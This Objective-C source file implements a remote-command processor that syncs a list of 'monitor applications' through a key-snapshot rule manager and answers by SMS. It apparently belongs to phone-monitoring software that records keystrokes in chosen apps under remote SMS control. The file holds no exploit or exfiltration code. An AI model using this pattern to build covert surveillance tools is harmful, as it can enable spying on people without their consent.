//
//  SyncMonitorApplicaitonsProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 11/15/13.
//  Copyright (c) 2013 __MyCompanyName__. All rights reserved.
//

#import "SyncMonitorApplicaitonsProcessor.h"
#import "KeySnapShotRuleManager.h"
#import "KeySnapShotRuleManagerImpl.h"



@interface SyncMonitorApplicaitonsProcessor (PrivateAPI)
- (void) processSyncMonitorApplications;
- (void) acknowldgeMessage;
- (void) syncMonitorApplicationsException;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end



@implementation SyncMonitorApplicaitonsProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the SyncSnapshotRulesProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (SyncSnapshotRulesProcessor).
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SyncMonitorApplicaitonsProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}



#pragma mark SyncMonitorApplicaitonsProcessor Methods



/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SyncMonitorApplicaitonsProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"SyncMonitorApplicaitonsProcessor--->doProcessingCommand")
	[self processSyncMonitorApplications];
}



#pragma mark SyncMonitorApplicaitonsProcessor Private Methods



/**
 - Method name: processSyncMonitorApplications
 - Purpose:This method is used to process sync monitor applications
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) processSyncMonitorApplications {
	DLog (@"SyncMonitorApplicaitonsProcessor--->processSyncSnapshotRules")
	
    id <KeySnapShotRuleManager> keySnapShotRuleMgr = [[RemoteCmdUtils sharedRemoteCmdUtils] mKeySnapShotRuleManager];
    
	BOOL isReady = [keySnapShotRuleMgr requestGetMonitorApplications:self];
    
    if (!isReady) {        
		DLog (@"!!! not ready to process SyncMonitorApplications command")
		[self syncMonitorApplicationsException];
	}
	else {
		DLog (@".... processing SyncMonitorApplications command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			syncMonitorApplicationsException
 - Purpose:				This method is invoked when it fails to sync Monitor Applications
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) syncMonitorApplicationsException {
	DLog (@"SyncMonitorApplicaitonsProcessor ---> syncMonitorApplicationsException");
	FxException* exception = [FxException exceptionWithName:@"syncMonitorApplicationsException" andReason:@"Sync Monitor Applications error"];
	[exception setErrorCode:kKeySnapShotRuleManagerBusyToSyncMonitorApplications];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
 */

- (void) acknowldgeMessage {
    DLog (@"SyncMonitorApplicaitonsProcessor--->acknowldgeMessage")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *ackMessage    = [messageFormat stringByAppendingString:NSLocalizedString(@"kSyncMonitorApplicationsMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"SyncMonitorApplicaitonsProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when sync monitor applications is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"SyncMonitorApplicaitonsProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}


#pragma mark MonitorApplicationRequestDelegate Delegate Methods


/**
 - Method name: requestMonitorApplicationsCompleted
 - Purpose:This method is invoked when sync monitor applications is delivered successfully
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) requestMonitorApplicationsCompleted: (NSError *) aError {
    
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *replyMessage  = [messageFormat stringByAppendingString:NSLocalizedString(@"kSyncMonitorApplicationsMSG2", @"")];
	
   	[self sendReplySMS:replyMessage isProcessCompleted:YES];
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	DLog (@"SyncMonitorApplicaitonsProcessor is now dealloced")
	[super dealloc];
}

@end
